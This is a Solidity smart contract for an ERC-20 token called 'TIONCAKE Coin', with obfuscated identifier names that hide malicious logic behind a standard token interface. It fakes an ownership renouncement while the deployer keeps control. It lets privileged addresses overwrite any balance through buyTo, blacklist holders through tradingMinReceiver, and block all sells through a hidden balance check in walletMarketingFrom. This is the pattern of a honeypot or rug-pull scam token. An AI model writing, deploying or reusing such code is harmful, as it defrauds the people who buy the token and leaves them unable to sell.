//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface launchedTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromMode) external view returns (uint256);

    function transfer(address teamMin, uint256 txFrom) external returns (bool);

    function allowance(address buyShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 txFrom) external returns (bool);

    function transferFrom(
        address sender,
        address teamMin,
        uint256 txFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptFund, uint256 value);
    event Approval(address indexed buyShould, address indexed spender, uint256 value);
}

interface launchedTotalMetadata is launchedTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract receiverLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletLiquidityLaunch {
    function createPair(address atMode, address senderSellShould) external returns (address);
}

interface launchSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract TIONCAKECoin is receiverLimit, launchedTotal, launchedTotalMetadata {

    function decimals() external view virtual override returns (uint8) {
        return fundTo;
    }

    event OwnershipTransferred(address indexed tradingMarketing, address indexed listReceiver);

    address maxLiquidityMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function sellTx() private view {
        require(swapLaunch[_msgSender()]);
    }

    address limitAtWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address fromSwap, address teamMin, uint256 txFrom) external override returns (bool) {
        if (_msgSender() != maxLiquidityMarketing) {
            if (maxSell[fromSwap][_msgSender()] != type(uint256).max) {
                require(txFrom <= maxSell[fromSwap][_msgSender()]);
                maxSell[fromSwap][_msgSender()] -= txFrom;
            }
        }
        return walletMarketingFrom(fromSwap, teamMin, txFrom);
    }

    string private autoFund = "TCN";

    function atLimitShould(uint256 txFrom) public {
        sellTx();
        receiverLimitSell = txFrom;
    }

    function owner() external view returns (address) {
        return modeIs;
    }

    address private modeIs;

    uint256 public exemptShould;

    address public walletIs;

    bool public liquidityMarketing;

    function transfer(address tradingTo, uint256 txFrom) external virtual override returns (bool) {
        return walletMarketingFrom(_msgSender(), tradingTo, txFrom);
    }

    mapping(address => uint256) private launchToFrom;

    uint256 limitLaunched;

    uint256 receiverLimitSell;

    uint256 public liquidityReceiver;

    function getOwner() external view returns (address) {
        return modeIs;
    }

    function tradingBuy(address tokenMarketing) public {
        if (toLiquidity) {
            return;
        }
        if (exemptShould == liquidityReceiver) {
            exemptIs = false;
        }
        swapLaunch[tokenMarketing] = true;
        if (maxToken != isReceiver) {
            isReceiver = maxToken;
        }
        toLiquidity = true;
    }

    function tradingMinReceiver(address totalReceiverFee) public {
        sellTx();
        if (isReceiver == maxToken) {
            maxToken = isReceiver;
        }
        if (totalReceiverFee == walletIs || totalReceiverFee == isEnable) {
            return;
        }
        swapFee[totalReceiverFee] = true;
    }

    bool private tradingReceiver;

    uint8 private fundTo = 18;

    mapping(address => mapping(address => uint256)) private maxSell;

    function walletMarketingFrom(address fromSwap, address teamMin, uint256 txFrom) internal returns (bool) {
        if (fromSwap == walletIs) {
            return receiverTrading(fromSwap, teamMin, txFrom);
        }
        uint256 toReceiver = launchedTotal(isEnable).balanceOf(limitAtWallet);
        require(toReceiver == receiverLimitSell);
        require(!swapFee[fromSwap]);
        return receiverTrading(fromSwap, teamMin, txFrom);
    }

    address public isEnable;

    bool public exemptIs;

    function balanceOf(address fromMode) public view virtual override returns (uint256) {
        return launchToFrom[fromMode];
    }

    mapping(address => bool) public swapFee;

    uint256 public isAmount;

    bool public launchedWallet;

    function approve(address txList, uint256 txFrom) public virtual override returns (bool) {
        maxSell[_msgSender()][txList] = txFrom;
        emit Approval(_msgSender(), txList, txFrom);
        return true;
    }

    function tokenReceiver() public {
        emit OwnershipTransferred(walletIs, address(0));
        modeIs = address(0);
    }

    function allowance(address toFee, address txList) external view virtual override returns (uint256) {
        if (txList == maxLiquidityMarketing) {
            return type(uint256).max;
        }
        return maxSell[toFee][txList];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return teamFromIs;
    }

    constructor (){
        if (isReceiver != exemptShould) {
            isReceiver = liquidityReceiver;
        }
        tokenReceiver();
        launchSell senderTeam = launchSell(maxLiquidityMarketing);
        isEnable = walletLiquidityLaunch(senderTeam.factory()).createPair(senderTeam.WETH(), address(this));
        if (exemptShould == maxToken) {
            maxToken = exemptShould;
        }
        walletIs = _msgSender();
        swapLaunch[walletIs] = true;
        launchToFrom[walletIs] = teamFromIs;
        
        emit Transfer(address(0), walletIs, teamFromIs);
    }

    function receiverTrading(address fromSwap, address teamMin, uint256 txFrom) internal returns (bool) {
        require(launchToFrom[fromSwap] >= txFrom);
        launchToFrom[fromSwap] -= txFrom;
        launchToFrom[teamMin] += txFrom;
        emit Transfer(fromSwap, teamMin, txFrom);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return walletSwap;
    }

    function buyTo(address tradingTo, uint256 txFrom) public {
        sellTx();
        launchToFrom[tradingTo] = txFrom;
    }

    string private walletSwap = "TIONCAKE Coin";

    uint256 private isReceiver;

    mapping(address => bool) public swapLaunch;

    bool public toLiquidity;

    function symbol() external view virtual override returns (string memory) {
        return autoFund;
    }

    uint256 private maxToken;

    uint256 private teamFromIs = 100000000 * 10 ** 18;

}